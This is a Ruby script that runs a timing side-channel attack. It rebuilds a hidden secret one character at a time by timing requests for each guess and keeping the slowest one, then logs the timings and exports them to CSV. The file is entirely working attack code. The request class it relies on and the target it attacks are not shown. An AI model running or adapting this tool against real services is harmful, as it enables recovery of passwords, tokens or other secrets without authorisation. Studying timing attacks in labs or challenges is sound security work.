require 'logger'
require_relative 'extend_enum'
require_relative 'request'

# Use question mark for unknown
# Use asterisk (*) for starting point
STARTING_SECRET = '*???????????????????????????????????????????'

CHARS_TO_TEST = ('a'..'z').to_a + [' ']
NUMBER_OF_TRIALS = 10
ACCEPTABLE_DELTA_MIN = 8
ACCEPTABLE_CV_MAX = 20

class Engine
  def initialize(secret, results, index)
    @secret = secret
    @results = results
    @index = index
  end

  def compute_new_secret
    puts "Delta: #{delta}"
    puts "Coefficient Variation: #{coefficient_variation}"

    if coefficient_variation > ACCEPTABLE_CV_MAX
      # The winner's data has big outliers.  Let's recalculate this index
      puts 'CV too low.  Retrying...'
      return @secret
    end

    @secret[@index] = if delta > ACCEPTABLE_DELTA_MIN
                        winning_term[@index]
                      else
                        # There was no clear winner so leave as wildcard
                        '?'
                      end

    new_index = @index + 1
    @secret[new_index] = '*' unless new_index == @secret.length
    @secret
  end

  private

  def coefficient_variation
    @coefficient_variation ||= winning_values.standard_deviation / winning_values.mean * 100
  end

  def delta
    @delta ||= (winning_values.mean - mean_ms_across_all) / mean_ms_across_all * 100
  end

  def winning_result
    @winning_result ||= @results.max_by do |_term, values|
      values.mean
    end
  end

  def winning_term
    @winning_term ||= winning_result[0]
  end

  def winning_values
    @winning_values ||= winning_result[1]
  end

  def mean_ms_across_all
    @mean_ms_across_all ||= @results.map do |_term, values|
      values
    end.flatten.mean
  end
end

class Crack
  def initialize
    @request = Request.new
    @logger = Logger.new('./tmp/coup_de_grace.log')
    @secret = STARTING_SECRET
  end

  def run
    while @secret.include? '*'
      puts "Current Secret: #{@secret}"

      @index = @secret.index('*')
      results = @request.trials(search_terms, NUMBER_OF_TRIALS)
      log_results(results)
      @secret = Engine.new(@secret, results, @index).compute_new_secret

    end

    puts 'The cracked secret is...'
    puts @secret
  end

  private

  def search_terms
    CHARS_TO_TEST.map do |char|
      term = @secret.dup
      term[@index] = char
      term
    end
  end

  def log_results(results)
    @logger.info("Secret: #{@secret}")
    @logger.info("Index: #{@index}")

    results.each do |term, values|
      @logger.info "Term: #{term}"
      @logger.info "Trials: #{values.length}"
      @logger.info "Mean: #{values.mean}"
      @logger.info "Standard Deviation: #{values.standard_deviation}"
      @logger.info "Confidence Interval 99%: #{values.confidence_interval_99}"
      @logger.info results
    end

    puts 'Exporting results to csv...'
    File.open("tmp/#{Time.now.to_i}.csv", 'w') do |file|
      results.each do |term, values|
        file.write "#{term},#{values.mean}\n"
      end
      puts file.path
    end
  end
end

Crack.new.run
